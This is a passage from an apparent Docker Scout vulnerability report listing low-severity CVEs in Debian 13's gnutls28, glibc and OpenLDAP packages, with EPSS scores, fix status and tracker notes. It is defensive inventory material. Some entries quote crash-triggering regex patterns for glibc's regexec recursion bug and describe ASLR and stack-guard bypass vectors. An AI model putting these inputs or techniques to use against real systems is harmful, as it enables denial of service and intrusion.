GnuTLS v3.8.13 does not reject a critical keyUsage extension when it cannot be processed, such as when extnValue is an ASN.1 NULL (05 00) instead of a BIT STRING. NOTE: the Supplier does not consider this an actionable security vulnerability because of its "threat model doesn't consider attacks only possible by modifying anything within the trust boundary (private keys, trusted certificate authorities and their issued certificates including intermediate CAs, etc.)" policy.

---
- gnutls28 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1150522; unimportant)
https://github.com/lkloliver/poc/tree/main/CVE-2026-95210
Not considered security issues by GNU TLS upstream within the GNU TLS security policy

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-95209?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--95209" src="https://img.shields.io/badge/CVE--2026--95209-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.241%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue in gnutls v3.8.13 causes legitimate CA certificates to be rejected, leading to a Denial of Service (DoS). NOTE: this is disputed by multiple parties because the behavior does not offer a new ability for an adversary to conduct a denial of service, and because the product can reasonably choose to enforce a dNSName constraint against Common Name when Subject Alternative Name is absent.

---
REJECTED

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-95184?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--95184" src="https://img.shields.io/badge/CVE--2026--95184-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.341%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>20th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GnuTLS v3.8.13 does not properly enforce name constraints, as demonstrated by a permitted subtree violation for "EE O=Evil accepted although outside permitted O=Good." NOTE: the Supplier does not consider this an actionable security vulnerability because of its "threat model doesn't consider attacks only possible by modifying anything within the trust boundary (private keys, trusted certificate authorities and their issued certificates including intermediate CAs, etc.)" policy.

---
- gnutls28 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1150522; unimportant)
https://github.com/lkloliver/poc/tree/main/CVE-2026-95184
Not considered security issues by GNU TLS upstream within the GNU TLS security policy

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-88648?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--88648" src="https://img.shields.io/badge/CVE--2026--88648-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.249%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In GnuTLS v3.8.13, an excluded msUPN/SRV otherName is never checked. NOTE: the Supplier does not consider this an actionable security vulnerability because of its "threat model doesn't consider attacks only possible by modifying anything within the trust boundary (private keys, trusted certificate authorities and their issued certificates including intermediate CAs, etc.)" policy.

---
- gnutls28 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1150522; unimportant)
https://github.com/lkloliver/poc/tree/main/CVE-2026-88648
Not considered security issues by GNU TLS upstream within the GNU TLS security policy

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-88647?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--88647" src="https://img.shields.io/badge/CVE--2026--88647-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.268%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GnuTLS v3.8.13 can perhaps unexpectedly trust a certificate on the basis of Common Name when Subject Alternative Name has an SRV otherName (1.3.6.1.5.5.7.8.7) whose value is an OCTET STRING. NOTE: the Supplier does not consider this an actionable security vulnerability because of its "threat model doesn't consider attacks only possible by modifying anything within the trust boundary (private keys, trusted certificate authorities and their issued certificates including intermediate CAs, etc.)" policy.

---
- gnutls28 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1150522; unimportant)
https://github.com/lkloliver/poc/tree/main/CVE-2026-88647
Not considered security issues by GNU TLS upstream within the GNU TLS security policy

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-67693?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--67693" src="https://img.shields.io/badge/CVE--2026--67693-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.205%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GnuTLS v3.8.13 does not reject end-entity X.509 certificates that contain a contradictory combination of Key Usage (KU) and Extended Key Usage (EKU). NOTE: the Supplier does not consider this an actionable security vulnerability because of its "threat model doesn't consider attacks only possible by modifying anything within the trust boundary (private keys, trusted certificate authorities and their issued certificates including intermediate CAs, etc.)" policy.

---
- gnutls28 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1150522; unimportant)
https://github.com/lkloliver/poc/tree/main/CVE-2026-67693
Not considered security issues by GNU TLS upstream within the GNU TLS security policy

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2011-3389?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2011--3389" src="https://img.shields.io/badge/CVE--2011--3389-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>73.327%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>100th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The SSL protocol, as used in certain configurations in Microsoft Windows and Microsoft Internet Explorer, Mozilla Firefox, Google Chrome, Opera, and other products, encrypts data by using CBC mode with chained initialization vectors, which allows man-in-the-middle attackers to obtain plaintext HTTP headers via a blockwise chosen-boundary attack (BCBA) on an HTTPS session, in conjunction with JavaScript code that uses (1) the HTML5 WebSocket API, (2) the Java URLConnection API, or (3) the Silverlight WebClient API, aka a "BEAST" attack.

---
- sun-java6 <removed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=645881)
[lenny] - sun-java6 <no-dsa> (Non-free not supported)
[squeeze] - sun-java6 <no-dsa> (Non-free not supported)
- openjdk-6 6b23~pre11-1
- openjdk-7 7~b147-2.0-1
- iceweasel <not-affected> (Vulnerable code not present)
http://blog.mozilla.com/security/2011/09/27/attack-against-tls-protected-communications/
- chromium-browser 15.0.874.106~r107270-1
[squeeze] - chromium-browser <end-of-life>
- lighttpd 1.4.30-1
strictly speaking this is no lighttpd issue, but lighttpd adds a workaround
- curl 7.24.0-1
http://curl.haxx.se/docs/adv_20120124B.html
- python2.6 2.6.8-0.1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=684511)
[squeeze] - python2.6 <no-dsa> (Minor issue)
- python2.7 2.7.3~rc1-1
- python3.1 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=678998)
[squeeze] - python3.1 <no-dsa> (Minor issue)
- python3.2 3.2.3~rc1-1
http://bugs.python.org/issue13885
python3.1 is fixed starting 3.1.5
- cyassl <removed>
- gnutls26 <removed> (unimportant)
- gnutls28 <unfixed> (unimportant)
No mitigation for gnutls, it is recommended to use TLS 1.1 or 1.2 which is supported since 2.0.0
- haskell-tls <unfixed> (unimportant)
No mitigation for haskell-tls, it is recommended to use TLS 1.1, which is supported since 0.2
- matrixssl <removed> (low)
[squeeze] - matrixssl <no-dsa> (Minor issue)
[wheezy] - matrixssl <no-dsa> (Minor issue)
matrixssl fix this upstream in 3.2.2
- bouncycastle 1.49+dfsg-1
[squeeze] - bouncycastle <no-dsa> (Minor issue)
[wheezy] - bouncycastle <no-dsa> (Minor issue)
No mitigation for bouncycastle, it is recommended to use TLS 1.1, which is supported since 1.4.9
- nss 3.13.1.with.ckbi.1.88-1
https://bugzilla.mozilla.org/show_bug.cgi?id=665814
https://hg.mozilla.org/projects/nss/rev/7f7446fcc7ab
- polarssl <unfixed> (unimportant)
No mitigation for polarssl, it is recommended to use TLS 1.1, which is supported in all releases
- tlslite <removed>
[wheezy] - tlslite <no-dsa> (Minor issue)
- pound 2.6-2
Pound 2.6-2 added an anti_beast.patch to mitigate BEAST attacks.
- erlang 1:15.b-dfsg-1
[squeeze] - erlang <no-dsa> (Minor issue)
- asterisk 1:13.7.2~dfsg-1
[jessie] - asterisk 1:11.13.1~dfsg-2+deb8u1
[wheezy] - asterisk <no-dsa> (Minor issue)
[squeeze] - asterisk <end-of-life> (Not supported in Squeeze LTS)
http://downloads.digium.com/pub/security/AST-2016-001.html
https://issues.asterisk.org/jira/browse/ASTERISK-24972
patch for 11 (jessie): https://code.asterisk.org/code/changelog/asterisk?cs=f233bcd81d85626ce5bdd27b05bc95d131faf3e4
all versions vulnerable, backport required for wheezy

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 7" src="https://img.shields.io/badge/L-7-fce1a9"/> <!-- unspecified: 0 --><strong>libc-bin</strong> <code>2.41-12+deb13u5</code> (deb)</summary>

<small><code>pkg:deb/debian/libc-bin@2.41-12%2Bdeb13u5?arch=amd64&distro=debian-13.8&upstream=glibc</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2019-9192?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2019--9192" src="https://img.shields.io/badge/CVE--2019--9192-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.447%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>85th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(|)(\\1\\1)*' in grep, a different issue than CVE-2018-20796. NOTE: the software maintainer disputes that this is a vulnerability because the behavior occurs only with a crafted pattern

---
- glibc <unfixed> (unimportant)
- eglibc <removed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=24269

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010025?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2019--1010025" src="https://img.shields.io/badge/CVE--2019--1010025-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.478%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>85th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may guess the heap addresses of pthread_created thread. The component is: glibc. NOTE: the vendor's position is "ASLR bypass itself is not a vulnerability.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22853

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010024?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2019--1010024" src="https://img.shields.io/badge/CVE--2019--1010024-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>3.220%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>89th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass ASLR using cache of thread stack and heap. The component is: glibc. NOTE: Upstream comments indicate "this is being treated as a non-security bug and no real threat.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22852

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010023?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2019--1010023" src="https://img.shields.io/badge/CVE--2019--1010023-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>3.069%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>88th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Re-mapping current loaded library with malicious ELF file. The impact is: In worst case attacker may evaluate privileges. The component is: libld. The attack vector is: Attacker sends 2 ELF files to victim and asks to run ldd on it. ldd execute code. NOTE: Upstream comments indicate "this is being treated as a non-security bug and no real threat.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22851

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010022?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2019--1010022" src="https://img.shields.io/badge/CVE--2019--1010022-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>3.249%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>89th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass stack guard protection. The component is: nptl. The attack vector is: Exploit stack buffer overflow vulnerability and use this bypass vulnerability to bypass stack guard. NOTE: Upstream comments indicate "this is being treated as a non-security bug and no real threat.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22850

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-20796?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2018--20796" src="https://img.shields.io/badge/CVE--2018--20796-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>5.804%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>94th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(\227|)(\\1\\1|t1|\\\2537)+' in grep.

---
- glibc <unfixed> (unimportant)
- eglibc <removed> (unimportant)
https://debbugs.gnu.org/cgi/bugreport.cgi?bug=34141
https://lists.gnu.org/archive/html/bug-gnulib/2019-01/msg00108.html
No treated as vulnerability: https://sourceware.org/glibc/wiki/Security%20Exceptions

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2010-4756?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2010--4756" src="https://img.shields.io/badge/CVE--2010--4756-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.633%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>86th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The glob implementation in the GNU C Library (aka glibc or libc6) allows remote authenticated users to cause a denial of service (CPU and memory consumption) via crafted glob expressions that do not match any pathnames, as demonstrated by glob expressions in STAT commands to an FTP daemon, a different vulnerability than CVE-2010-2632.

---
- glibc <removed> (unimportant)
- eglibc <unfixed> (unimportant)
That's standard POSIX behaviour implemented by (e)glibc. Applications using
glob need to impose limits for themselves

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 7" src="https://img.shields.io/badge/L-7-fce1a9"/> <!-- unspecified: 0 --><strong>libc6</strong> <code>2.41-12+deb13u5</code> (deb)</summary>

<small><code>pkg:deb/debian/libc6@2.41-12%2Bdeb13u5?arch=amd64&distro=debian-13.8&upstream=glibc</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2019-9192?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2019--9192" src="https://img.shields.io/badge/CVE--2019--9192-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.447%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>85th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(|)(\\1\\1)*' in grep, a different issue than CVE-2018-20796. NOTE: the software maintainer disputes that this is a vulnerability because the behavior occurs only with a crafted pattern

---
- glibc <unfixed> (unimportant)
- eglibc <removed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=24269

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010025?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2019--1010025" src="https://img.shields.io/badge/CVE--2019--1010025-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.478%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>85th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may guess the heap addresses of pthread_created thread. The component is: glibc. NOTE: the vendor's position is "ASLR bypass itself is not a vulnerability.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22853

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010024?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2019--1010024" src="https://img.shields.io/badge/CVE--2019--1010024-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>3.220%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>89th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass ASLR using cache of thread stack and heap. The component is: glibc. NOTE: Upstream comments indicate "this is being treated as a non-security bug and no real threat.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22852

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010023?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2019--1010023" src="https://img.shields.io/badge/CVE--2019--1010023-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>3.069%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>88th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Re-mapping current loaded library with malicious ELF file. The impact is: In worst case attacker may evaluate privileges. The component is: libld. The attack vector is: Attacker sends 2 ELF files to victim and asks to run ldd on it. ldd execute code. NOTE: Upstream comments indicate "this is being treated as a non-security bug and no real threat.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22851

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010022?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2019--1010022" src="https://img.shields.io/badge/CVE--2019--1010022-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>3.249%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>89th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass stack guard protection. The component is: nptl. The attack vector is: Exploit stack buffer overflow vulnerability and use this bypass vulnerability to bypass stack guard. NOTE: Upstream comments indicate "this is being treated as a non-security bug and no real threat.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22850

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-20796?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2018--20796" src="https://img.shields.io/badge/CVE--2018--20796-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>5.804%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>94th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(\227|)(\\1\\1|t1|\\\2537)+' in grep.

---
- glibc <unfixed> (unimportant)
- eglibc <removed> (unimportant)
https://debbugs.gnu.org/cgi/bugreport.cgi?bug=34141
https://lists.gnu.org/archive/html/bug-gnulib/2019-01/msg00108.html
No treated as vulnerability: https://sourceware.org/glibc/wiki/Security%20Exceptions

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2010-4756?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2010--4756" src="https://img.shields.io/badge/CVE--2010--4756-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.633%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>86th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The glob implementation in the GNU C Library (aka glibc or libc6) allows remote authenticated users to cause a denial of service (CPU and memory consumption) via crafted glob expressions that do not match any pathnames, as demonstrated by glob expressions in STAT commands to an FTP daemon, a different vulnerability than CVE-2010-2632.

---
- glibc <removed> (unimportant)
- eglibc <unfixed> (unimportant)
That's standard POSIX behaviour implemented by (e)glibc. Applications using
glob need to impose limits for themselves

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 5" src="https://img.shields.io/badge/L-5-fce1a9"/> <!-- unspecified: 0 --><strong>libldap2</strong> <code>2.6.10+dfsg-1</code> (deb)</summary>

<small><code>pkg:deb/debian/libldap2@2.6.10%2Bdfsg-1?arch=amd64&distro=debian-13.8&upstream=openldap</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-22185?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--22185" src="https://img.shields.io/badge/CVE--2026--22185-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.184%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

OpenLDAP Lightning Memory-Mapped Database (LMDB) versions 0.9.14 before 0.9.34, prior to commit 8e1fda8, contain a heap buffer underflow in the readline() function of mdb_load. When processing malformed input containing an embedded NUL byte, an unsigned offset calculation can underflow and cause an out-of-bounds read of one byte before the allocated heap buffer. This can cause mdb_load to crash, leading to a limited denial-of-service condition.

---
- openldap <unfixed> (unimportant)
- lmdb 0.9.35-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1126287)
[trixie] - lmdb <no-dsa> (Minor issue)
[bookworm] - lmdb <no-dsa> (Minor issue)
[bullseye] - lmdb <postponed> (Minor issue, OOB read)
https://seclists.org/fulldisclosure/2026/Jan/5
https://bugs.openldap.org/show_bug.cgi?id=10421
Fixed by: https://git.openldap.org/openldap/openldap/-/commit/8e1fda85532a3c74276df38a42d234dcdfa1e40d
OpenLDAP bundles lmdb but does not build mdb_load.c

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2020-15719?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2020--15719" src="https://img.shields.io/badge/CVE--2020--15719-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.515%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>86th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libldap in certain third-party OpenLDAP packages has a certificate-validation flaw when the third-party package is asserting RFC6125 support. It considers CN even when there is a non-matching subjectAltName (SAN). This is fixed in, for example, openldap-2.4.46-10.el8 in Red Hat Enterprise Linux.

---
- openldap <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=965184)
https://bugs.openldap.org/show_bug.cgi?id=9266
https://bugzilla.redhat.com/show_bug.cgi?id=1740070
RedHat/CentOS applied patch: https://git.centos.org/rpms/openldap/raw/67459960064be9d226d57c5f82aaba0929876813/f/SOURCES/openldap-tlso-dont-check-cn-when-bad-san.patch
OpenLDAP upstream did dispute the issue as beeing valid, as the current libldap
behaviour does conform with RFC4513. RFC6125 does not superseed the rules for
verifying service identity provided in specifications for existing application
protocols published prior to RFC6125, like RFC4513 for LDAP.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-17740?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2017--17740" src="https://img.shields.io/badge/CVE--2017--17740-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>7.022%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>95th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

contrib/slapd-modules/nops/nops.c in OpenLDAP through 2.4.45, when both the nops module and the memberof overlay are enabled, attempts to free a buffer that was allocated on the stack, which allows remote attackers to cause a denial of service (slapd crash) via a member MODDN operation.

---
- openldap <unfixed> (unimportant)
http://www.openldap.org/its/index.cgi/Incoming?id=8759
nops slapd-module not built

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-14159?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2017--14159" src="https://img.shields.io/badge/CVE--2017--14159-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
